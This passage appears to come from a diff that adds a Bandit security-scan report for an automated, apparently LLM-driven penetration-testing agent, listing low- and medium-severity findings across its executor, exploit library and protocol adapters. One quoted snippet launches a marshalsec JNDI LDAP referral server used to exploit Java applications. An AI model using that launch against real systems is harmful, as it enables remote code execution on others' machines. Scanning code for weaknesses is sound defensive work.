+      "issue_text": "Probable insecure usage of temp file/directory.",
+      "line_number": 694,
+      "line_range": [
+        653,
+        654,
+        655,
+        656,
+        657,
+        658,
+        659,
+        660,
+        661,
+        662,
+        663,
+        664,
+        665,
+        666,
+        667,
+        668,
+        669,
+        670,
+        671,
+        672,
+        673,
+        674,
+        675,
+        676,
+        677,
+        678,
+        679,
+        680,
+        681,
+        682,
+        683,
+        684,
+        685,
+        686,
+        687,
+        688,
+        689,
+        690,
+        691,
+        692,
+        693,
+        694,
+        695,
+        696,
+        697,
+        698,
+        699,
+        700,
+        701,
+        702,
+        703,
+        704,
+        705,
+        706,
+        707,
+        708,
+        709,
+        710,
+        711,
+        712,
+        713,
+        714,
+        715,
+        716,
+        717,
+        718,
+        719,
+        720,
+        721,
+        722,
+        723,
+        724,
+        725,
+        726,
+        727
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b108_hardcoded_tmp_directory.html",
+      "test_id": "B108",
+      "test_name": "hardcoded_tmp_directory"
+    },
+    {
+      "code": "6 import select\n7 import subprocess\n8 import shutil\n",
+      "col_offset": 0,
+      "end_col_offset": 17,
+      "filename": "app\\services\\pentest_agent\\executor.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 78,
+        "link": "https://cwe.mitre.org/data/definitions/78.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Consider possible security implications associated with the subprocess module.",
+      "line_number": 7,
+      "line_range": [
+        7
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_imports.html#b404-import-subprocess",
+      "test_id": "B404",
+      "test_name": "blacklist"
+    },
+    {
+      "code": "129         try:\n130             proc = subprocess.run(\n131                 ssh_parts, capture_output=True,\n132                 timeout=timeout,\n133             )\n134             stdout = proc.stdout.decode(\"utf-8\", errors=\"replace\")\n",
+      "col_offset": 19,
+      "end_col_offset": 13,
+      "filename": "app\\services\\pentest_agent\\executor.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 78,
+        "link": "https://cwe.mitre.org/data/definitions/78.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "subprocess call - check for execution of untrusted input.",
+      "line_number": 130,
+      "line_range": [
+        130,
+        131,
+        132,
+        133
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b603_subprocess_without_shell_equals_true.html",
+      "test_id": "B603",
+      "test_name": "subprocess_without_shell_equals_true"
+    },
+    {
+      "code": "897         try:\n898             completed = subprocess.run(\n899                 argv,\n900                 capture_output=True,\n901                 text=True,\n902                 timeout=timeout,\n903                 check=False,\n904             )\n905         except Exception:\n",
+      "col_offset": 24,
+      "end_col_offset": 13,
+      "filename": "app\\services\\pentest_agent\\executor.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 78,
+        "link": "https://cwe.mitre.org/data/definitions/78.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "subprocess call - check for execution of untrusted input.",
+      "line_number": 898,
+      "line_range": [
+        898,
+        899,
+        900,
+        901,
+        902,
+        903,
+        904
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b603_subprocess_without_shell_equals_true.html",
+      "test_id": "B603",
+      "test_name": "subprocess_without_shell_equals_true"
+    },
+    {
+      "code": "1194             # \u5904\u7406 --script value \u683c\u5f0f\uff08\u7a7a\u683c\u5206\u9694\uff09\n1195             if token == \"--script\":\n1196                 if idx + 1 < len(parts):\n",
+      "col_offset": 24,
+      "end_col_offset": 34,
+      "filename": "app\\services\\pentest_agent\\executor.py",
+      "issue_confidence": "MEDIUM",
+      "issue_cwe": {
+        "id": 259,
+        "link": "https://cwe.mitre.org/data/definitions/259.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Possible hardcoded password: '--script'",
+      "line_number": 1195,
+      "line_range": [
+        1195
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html",
+      "test_id": "B105",
+      "test_name": "hardcoded_password_string"
+    },
+    {
+      "code": "1304         for idx, token in enumerate(parts):\n1305             if token != \"-P\" or idx + 1 >= len(parts):\n1306                 continue\n",
+      "col_offset": 24,
+      "end_col_offset": 28,
+      "filename": "app\\services\\pentest_agent\\executor.py",
+      "issue_confidence": "MEDIUM",
+      "issue_cwe": {
+        "id": 259,
+        "link": "https://cwe.mitre.org/data/definitions/259.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Possible hardcoded password: '-P'",
+      "line_number": 1305,
+      "line_range": [
+        1305
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html",
+      "test_id": "B105",
+      "test_name": "hardcoded_password_string"
+    },
+    {
+      "code": "2379                             q.put((label, chunk))\n2380                     except Exception:\n2381                         pass\n2382                     finally:\n",
+      "col_offset": 20,
+      "end_col_offset": 28,
+      "filename": "app\\services\\pentest_agent\\executor.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 703,
+        "link": "https://cwe.mitre.org/data/definitions/703.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Try, Except, Pass detected.",
+      "line_number": 2380,
+      "line_range": [
+        2380,
+        2381
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html",
+      "test_id": "B110",
+      "test_name": "try_except_pass"
+    },
+    {
+      "code": "2385                             stream.close()\n2386                         except Exception:\n2387                             pass\n2388 \n",
+      "col_offset": 24,
+      "end_col_offset": 32,
+      "filename": "app\\services\\pentest_agent\\executor.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 703,
+        "link": "https://cwe.mitre.org/data/definitions/703.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Try, Except, Pass detected.",
+      "line_number": 2386,
+      "line_range": [
+        2386,
+        2387
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html",
+      "test_id": "B110",
+      "test_name": "try_except_pass"
+    },
+    {
+      "code": "2406                             proc.kill()\n2407                         except Exception:\n2408                             pass\n2409                         break\n",
+      "col_offset": 24,
+      "end_col_offset": 32,
+      "filename": "app\\services\\pentest_agent\\executor.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 703,
+        "link": "https://cwe.mitre.org/data/definitions/703.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Try, Except, Pass detected.",
+      "line_number": 2407,
+      "line_range": [
+        2407,
+        2408
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html",
+      "test_id": "B110",
+      "test_name": "try_except_pass"
+    },
+    {
+      "code": "25 import socket as _socket\n26 import subprocess as _subprocess\n27 from typing import Any, Optional\n",
+      "col_offset": 0,
+      "end_col_offset": 32,
+      "filename": "app\\services\\pentest_agent\\exploit_lib\\__init__.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 78,
+        "link": "https://cwe.mitre.org/data/definitions/78.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Consider possible security implications associated with the subprocess module.",
+      "line_number": 26,
+      "line_range": [
+        26
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_imports.html#b404-import-subprocess",
+      "test_id": "B404",
+      "test_name": "blacklist"
+    },
+    {
+      "code": "169         urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\n170     except Exception:\n171         pass\n172     import time as _time\n",
+      "col_offset": 4,
+      "end_col_offset": 12,
+      "filename": "app\\services\\pentest_agent\\exploit_lib\\__init__.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 703,
+        "link": "https://cwe.mitre.org/data/definitions/703.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Try, Except, Pass detected.",
+      "line_number": 170,
+      "line_range": [
+        170,
+        171
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html",
+      "test_id": "B110",
+      "test_name": "try_except_pass"
+    },
+    {
+      "code": "253     from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes\n254     cipher = Cipher(algorithms.AES(key), modes.ECB())\n255     ctx = cipher.encryptor()\n",
+      "col_offset": 41,
+      "end_col_offset": 52,
+      "filename": "app\\services\\pentest_agent\\exploit_lib\\__init__.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 327,
+        "link": "https://cwe.mitre.org/data/definitions/327.html"
+      },
+      "issue_severity": "MEDIUM",
+      "issue_text": "Use of insecure cipher mode cryptography.hazmat.primitives.ciphers.modes.ECB.",
+      "line_number": 254,
+      "line_range": [
+        254
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_calls.html#b304-b305-ciphers-and-modes",
+      "test_id": "B305",
+      "test_name": "blacklist"
+    },
+    {
+      "code": "389         return {\"success\": False, \"error\": \"java not in PATH\"}\n390     proc = _subprocess.Popen(\n391         [\"java\", \"-cp\", jar, \"marshalsec.jndi.LDAPRefServer\",\n392          class_url, str(port)],\n393         stdout=_subprocess.PIPE, stderr=_subprocess.PIPE,\n394     )\n395 \n",
+      "col_offset": 11,
+      "end_col_offset": 5,
+      "filename": "app\\services\\pentest_agent\\exploit_lib\\__init__.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 78,
+        "link": "https://cwe.mitre.org/data/definitions/78.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Starting a process with a partial executable path",
+      "line_number": 390,
+      "line_range": [
+        390,
+        391,
+        392,
+        393,
+        394
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b607_start_process_with_partial_path.html",
+      "test_id": "B607",
+      "test_name": "start_process_with_partial_path"
+    },
+    {
+      "code": "389         return {\"success\": False, \"error\": \"java not in PATH\"}\n390     proc = _subprocess.Popen(\n391         [\"java\", \"-cp\", jar, \"marshalsec.jndi.LDAPRefServer\",\n392          class_url, str(port)],\n393         stdout=_subprocess.PIPE, stderr=_subprocess.PIPE,\n394     )\n395 \n",
+      "col_offset": 11,
+      "end_col_offset": 5,
+      "filename": "app\\services\\pentest_agent\\exploit_lib\\__init__.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 78,
+        "link": "https://cwe.mitre.org/data/definitions/78.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "subprocess call - check for execution of untrusted input.",
+      "line_number": 390,
+      "line_range": [
+        390,
+        391,
+        392,
+        393,
+        394
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b603_subprocess_without_shell_equals_true.html",
+      "test_id": "B603",
+      "test_name": "subprocess_without_shell_equals_true"
+    },
+    {
+      "code": "402                 proc.kill()\n403             except Exception:\n404                 pass\n405 \n",
+      "col_offset": 12,
+      "end_col_offset": 20,
+      "filename": "app\\services\\pentest_agent\\exploit_lib\\__init__.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 703,
+        "link": "https://cwe.mitre.org/data/definitions/703.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Try, Except, Pass detected.",
+      "line_number": 403,
+      "line_range": [
+        403,
+        404
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html",
+      "test_id": "B110",
+      "test_name": "try_except_pass"
+    },
+    {
+      "code": "414     try:\n415         proc = _subprocess.run(\n416             cmd, input=input, capture_output=True, timeout=timeout,\n417             env=env, check=False,\n418         )\n419         return proc.returncode, proc.stdout or b\"\", proc.stderr or b\"\"\n",
+      "col_offset": 15,
+      "end_col_offset": 9,
+      "filename": "app\\services\\pentest_agent\\exploit_lib\\__init__.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 78,
+        "link": "https://cwe.mitre.org/data/definitions/78.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "subprocess call - check for execution of untrusted input.",
+      "line_number": 415,
+      "line_range": [
+        415,
+        416,
+        417,
+        418
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b603_subprocess_without_shell_equals_true.html",
+      "test_id": "B603",
+      "test_name": "subprocess_without_shell_equals_true"
+    },
+    {
+      "code": "144             s.close()\n145         if ip and ip != \"0.0.0.0\":\n146             _LHOST_CACHE[cache_key] = ip\n",
+      "col_offset": 24,
+      "end_col_offset": 33,
+      "filename": "app\\services\\pentest_agent\\exploit_retry.py",
+      "issue_confidence": "MEDIUM",
+      "issue_cwe": {
+        "id": 605,
+        "link": "https://cwe.mitre.org/data/definitions/605.html"
+      },
+      "issue_severity": "MEDIUM",
+      "issue_text": "Possible binding to all interfaces.",
+      "line_number": 145,
+      "line_range": [
+        145
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b104_hardcoded_bind_all_interfaces.html",
+      "test_id": "B104",
+      "test_name": "hardcoded_bind_all_interfaces"
+    },
+    {
+      "code": "147             return ip\n148     except Exception:\n149         pass\n150     _LHOST_CACHE[cache_key] = fallback\n",
+      "col_offset": 4,
+      "end_col_offset": 12,
+      "filename": "app\\services\\pentest_agent\\exploit_retry.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 703,
+        "link": "https://cwe.mitre.org/data/definitions/703.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Try, Except, Pass detected.",
+      "line_number": 148,
+      "line_range": [
+        148,
+        149
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html",
+      "test_id": "B110",
+      "test_name": "try_except_pass"
+    },
+    {
+      "code": "6 import select\n7 import subprocess\n8 import time\n",
+      "col_offset": 0,
+      "end_col_offset": 17,
+      "filename": "app\\services\\pentest_agent\\interactive_session.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 78,
+        "link": "https://cwe.mitre.org/data/definitions/78.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Consider possible security implications associated with the subprocess module.",
+      "line_number": 7,
+      "line_range": [
+        7
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_imports.html#b404-import-subprocess",
+      "test_id": "B404",
+      "test_name": "blacklist"
+    },
+    {
+      "code": "85                     self.process.wait(timeout=1)\n86                 except Exception:\n87                     pass\n88         self.process = None\n",
+      "col_offset": 16,
+      "end_col_offset": 24,
+      "filename": "app\\services\\pentest_agent\\interactive_session.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 703,
+        "link": "https://cwe.mitre.org/data/definitions/703.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Try, Except, Pass detected.",
+      "line_number": 86,
+      "line_range": [
+        86,
+        87
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html",
+      "test_id": "B110",
+      "test_name": "try_except_pass"
+    },
+    {
+      "code": "119             }\n120         assert self.process is not None and self.process.stdin is not None\n121         token = f\"__LOVELY_DONE__{uuid4().hex}\"\n",
+      "col_offset": 8,
+      "end_col_offset": 74,
+      "filename": "app\\services\\pentest_agent\\interactive_session.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 703,
+        "link": "https://cwe.mitre.org/data/definitions/703.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Use of assert detected. The enclosed code will be removed when compiling to optimised byte code.",
+      "line_number": 120,
+      "line_range": [
+        120
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b101_assert_used.html",
+      "test_id": "B101",
+      "test_name": "assert_used"
+    },
+    {
+      "code": "17 import time\n18 import subprocess\n19 import tempfile\n",
+      "col_offset": 0,
+      "end_col_offset": 17,
+      "filename": "app\\services\\pentest_agent\\kali_executor.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 78,
+        "link": "https://cwe.mitre.org/data/definitions/78.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Consider possible security implications associated with the subprocess module.",
+      "line_number": 18,
+      "line_range": [
+        18
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_imports.html#b404-import-subprocess",
+      "test_id": "B404",
+      "test_name": "blacklist"
+    },
+    {
+      "code": "172         try:\n173             result = subprocess.run(\n174                 cmd,\n175                 capture_output=True,\n176                 text=True,\n177                 timeout=timeout,\n178                 encoding=\"utf-8\",\n179                 errors=\"replace\",\n180             )\n181             duration = time.monotonic() - start\n",
+      "col_offset": 21,
+      "end_col_offset": 13,
+      "filename": "app\\services\\pentest_agent\\kali_executor.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 78,
+        "link": "https://cwe.mitre.org/data/definitions/78.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "subprocess call - check for execution of untrusted input.",
+      "line_number": 173,
+      "line_range": [
+        173,
+        174,
+        175,
+        176,
+        177,
+        178,
+        179,
+        180
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b603_subprocess_without_shell_equals_true.html",
+      "test_id": "B603",
+      "test_name": "subprocess_without_shell_equals_true"
+    },
+    {
+      "code": "265                                         on_chunk(delta_reasoning)\n266                                     except Exception:\n267                                         pass\n268                             if delta_content:\n",
+      "col_offset": 36,
+      "end_col_offset": 44,
+      "filename": "app\\services\\pentest_agent\\llm_client.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 703,
+        "link": "https://cwe.mitre.org/data/definitions/703.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Try, Except, Pass detected.",
+      "line_number": 266,
+      "line_range": [
+        266,
+        267
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html",
+      "test_id": "B110",
+      "test_name": "try_except_pass"
+    },
+    {
+      "code": "272                                         on_chunk(delta_content)\n273                                     except Exception:\n274                                         pass\n275 \n",
+      "col_offset": 36,
+      "end_col_offset": 44,
+      "filename": "app\\services\\pentest_agent\\llm_client.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 703,
+        "link": "https://cwe.mitre.org/data/definitions/703.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Try, Except, Pass detected.",
+      "line_number": 273,
+      "line_range": [
+        273,
+        274
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html",
+      "test_id": "B110",
+      "test_name": "try_except_pass"
+    },
+    {
+      "code": "24     except Exception:\n25         return \"0.0.0.0\"\n26 \n",
+      "col_offset": 15,
+      "end_col_offset": 24,
+      "filename": "app\\services\\pentest_agent\\planner.py",
+      "issue_confidence": "MEDIUM",
+      "issue_cwe": {
+        "id": 605,
+        "link": "https://cwe.mitre.org/data/definitions/605.html"
+      },
+      "issue_severity": "MEDIUM",
+      "issue_text": "Possible binding to all interfaces.",
+      "line_number": 25,
+      "line_range": [
+        25
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b104_hardcoded_bind_all_interfaces.html",
+      "test_id": "B104",
+      "test_name": "hardcoded_bind_all_interfaces"
+    },
+    {
+      "code": "264                 return tmpl\n265         except Exception:\n266             continue\n267     return None\n",
+      "col_offset": 8,
+      "end_col_offset": 20,
+      "filename": "app\\services\\pentest_agent\\planner.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 703,
+        "link": "https://cwe.mitre.org/data/definitions/703.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Try, Except, Continue detected.",
+      "line_number": 265,
+      "line_range": [
+        265,
+        266
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b112_try_except_continue.html",
+      "test_id": "B112",
+      "test_name": "try_except_continue"
+    },
+    {
+      "code": "19 import shutil\n20 import subprocess\n21 import tempfile\n",
+      "col_offset": 0,
+      "end_col_offset": 17,
+      "filename": "app\\services\\pentest_agent\\protocol_adapters\\jmx_adapter.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 78,
+        "link": "https://cwe.mitre.org/data/definitions/78.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Consider possible security implications associated with the subprocess module.",
+      "line_number": 20,
+      "line_range": [
+        20
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_imports.html#b404-import-subprocess",
+      "test_id": "B404",
+      "test_name": "blacklist"
+    },
+    {
+      "code": "44     try:\n45         proc = subprocess.run(\n46             cmd,\n47             capture_output=True,\n48             text=True,\n49             timeout=timeout,\n50             check=False,\n51         )\n52         return proc.returncode, proc.stdout or \"\", proc.stderr or \"\"\n",
+      "col_offset": 15,
+      "end_col_offset": 9,
+      "filename": "app\\services\\pentest_agent\\protocol_adapters\\jmx_adapter.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 78,
+        "link": "https://cwe.mitre.org/data/definitions/78.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "subprocess call - check for execution of untrusted input.",
+      "line_number": 45,
+      "line_range": [
+        45,
+        46,
+        47,
+        48,
+        49,
+        50,
+        51
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b603_subprocess_without_shell_equals_true.html",
+      "test_id": "B603",
+      "test_name": "subprocess_without_shell_equals_true"
+    },
+    {
+      "code": "172 \n173     def __init__(self, host: str, port: int = 27017, timeout: int = 5,\n174                  username: str = \"\", password: str = \"\", **kwargs):\n175         super().__init__(host=host, port=port, timeout=timeout, **kwargs)\n176         self.username = username or \"\"\n177         self.password = password or \"\"\n178 \n",
+      "col_offset": 4,
+      "end_col_offset": 38,
+      "filename": "app\\services\\pentest_agent\\protocol_adapters\\mongo_adapter.py",
+      "issue_confidence": "MEDIUM",
+      "issue_cwe": {
+        "id": 259,
+        "link": "https://cwe.mitre.org/data/definitions/259.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Possible hardcoded password: ''",
+      "line_number": 173,
+      "line_range": [
+        173,
+        174,
+        175,
+        176,
+        177
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b107_hardcoded_password_default.html",
+      "test_id": "B107",
+      "test_name": "hardcoded_password_default"
+    },
+    {
+      "code": "207                 sock.close()\n208             except Exception:\n209                 pass\n210 \n",
+      "col_offset": 12,
+      "end_col_offset": 20,
+      "filename": "app\\services\\pentest_agent\\protocol_adapters\\mongo_adapter.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 703,
+        "link": "https://cwe.mitre.org/data/definitions/703.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Try, Except, Pass detected.",
+      "line_number": 208,
+      "line_range": [
+        208,
+        209
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html",
+      "test_id": "B110",
+      "test_name": "try_except_pass"
+    },
+    {
+      "code": "119 \n120     def __init__(self, host: str, port: int = 6379, timeout: int = 5,\n121                  password: str = \"\", **kwargs):\n122         super().__init__(host=host, port=port, timeout=timeout, **kwargs)\n123         self.password = password or \"\"\n124 \n",
+      "col_offset": 4,
+      "end_col_offset": 38,
+      "filename": "app\\services\\pentest_agent\\protocol_adapters\\redis_adapter.py",
+      "issue_confidence": "MEDIUM",
+      "issue_cwe": {
+        "id": 259,
+        "link": "https://cwe.mitre.org/data/definitions/259.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Possible hardcoded password: ''",
+      "line_number": 120,
+      "line_range": [
+        120,
+        121,
+        122,
+        123
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b107_hardcoded_password_default.html",
+      "test_id": "B107",
+      "test_name": "hardcoded_password_default"
+    },
+    {
+      "code": "146                 sock.close()\n147             except Exception:\n148                 pass\n149 \n",
+      "col_offset": 12,
+      "end_col_offset": 20,
+      "filename": "app\\services\\pentest_agent\\protocol_adapters\\redis_adapter.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 703,
+        "link": "https://cwe.mitre.org/data/definitions/703.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Try, Except, Pass detected.",
+      "line_number": 147,
+      "line_range": [
+        147,
+        148
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html",
+      "test_id": "B110",
+      "test_name": "try_except_pass"
+    },
+    {
+      "code": "310                     sock.close()\n311                 except Exception:\n312                     pass\n313         except Exception as e:\n",
+      "col_offset": 16,
+      "end_col_offset": 24,
+      "filename": "app\\services\\pentest_agent\\protocol_adapters\\redis_adapter.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 703,
+        "link": "https://cwe.mitre.org/data/definitions/703.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Try, Except, Pass detected.",
+      "line_number": 311,
+      "line_range": [
+        311,
+        312
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html",
+      "test_id": "B110",
+      "test_name": "try_except_pass"
+    },
+    {
+      "code": "31 import signal\n32 import subprocess\n33 import sys\n",
+      "col_offset": 0,
+      "end_col_offset": 17,
+      "filename": "app\\services\\pentest_agent\\python_exploit.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 78,
+        "link": "https://cwe.mitre.org/data/definitions/78.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Consider possible security implications associated with the subprocess module.",
+      "line_number": 32,
+      "line_range": [
+        32
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_imports.html#b404-import-subprocess",
+      "test_id": "B404",
+      "test_name": "blacklist"
+    },
+    {
+      "code": "127         if os.name == \"nt\":\n128             subprocess.run(\n129                 [\"taskkill\", \"/F\", \"/T\", \"/PID\", str(proc.pid)],\n130                 capture_output=True, timeout=5,\n131             )\n132         else:\n",
+      "col_offset": 12,
+      "end_col_offset": 13,
+      "filename": "app\\services\\pentest_agent\\python_exploit.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 78,
+        "link": "https://cwe.mitre.org/data/definitions/78.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Starting a process with a partial executable path",
+      "line_number": 128,
+      "line_range": [
+        128,
+        129,
+        130,
+        131
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b607_start_process_with_partial_path.html",
+      "test_id": "B607",
+      "test_name": "start_process_with_partial_path"
+    },
+    {
+      "code": "127         if os.name == \"nt\":\n128             subprocess.run(\n129                 [\"taskkill\", \"/F\", \"/T\", \"/PID\", str(proc.pid)],\n130                 capture_output=True, timeout=5,\n131             )\n132         else:\n",
+      "col_offset": 12,
+      "end_col_offset": 13,
+      "filename": "app\\services\\pentest_agent\\python_exploit.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 78,
+        "link": "https://cwe.mitre.org/data/definitions/78.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "subprocess call - check for execution of untrusted input.",
+      "line_number": 128,
+      "line_range": [
+        128,
+        129,
+        130,
+        131
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b603_subprocess_without_shell_equals_true.html",
+      "test_id": "B603",
+      "test_name": "subprocess_without_shell_equals_true"
+    },
+    {
+      "code": "139             proc.kill()\n140         except Exception:\n141             pass\n142 \n",
+      "col_offset": 8,
+      "end_col_offset": 16,
+      "filename": "app\\services\\pentest_agent\\python_exploit.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 703,
+        "link": "https://cwe.mitre.org/data/definitions/703.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Try, Except, Pass detected.",
+      "line_number": 140,
+      "line_range": [
+        140,
+        141
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html",
+      "test_id": "B110",
+      "test_name": "try_except_pass"
+    },
+    {
+      "code": "189     try:\n190         proc = subprocess.Popen(\n191             [sys.executable, runner_path], **popen_kwargs\n192         )\n193         try:\n",
+      "col_offset": 15,
+      "end_col_offset": 9,
+      "filename": "app\\services\\pentest_agent\\python_exploit.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 78,
+        "link": "https://cwe.mitre.org/data/definitions/78.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "subprocess call - check for execution of untrusted input.",
+      "line_number": 190,
+      "line_range": [
+        190,
+        191,
+        192
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b603_subprocess_without_shell_equals_true.html",
+      "test_id": "B603",
+      "test_name": "subprocess_without_shell_equals_true"
+    },
+    {
+      "code": "553             return state.build_target_fingerprint()\n554         except Exception:\n555             pass\n556     # \u515c\u5e95\uff1a\u4ece data.findings \u63d0\u53d6\n",
+      "col_offset": 8,
+      "end_col_offset": 16,
+      "filename": "app\\services\\pentest_agent\\reflection.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 703,
+        "link": "https://cwe.mitre.org/data/definitions/703.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Try, Except, Pass detected.",
+      "line_number": 554,
+      "line_range": [
+        554,
+        555
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html",
+      "test_id": "B110",
+      "test_name": "try_except_pass"
+    },
+    {
+      "code": "619                 state_evidence[\"services\"].add(s)\n620     except Exception:\n621         pass\n622 \n",
+      "col_offset": 4,
+      "end_col_offset": 12,
+      "filename": "app\\services\\pentest_agent\\reflection.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 703,
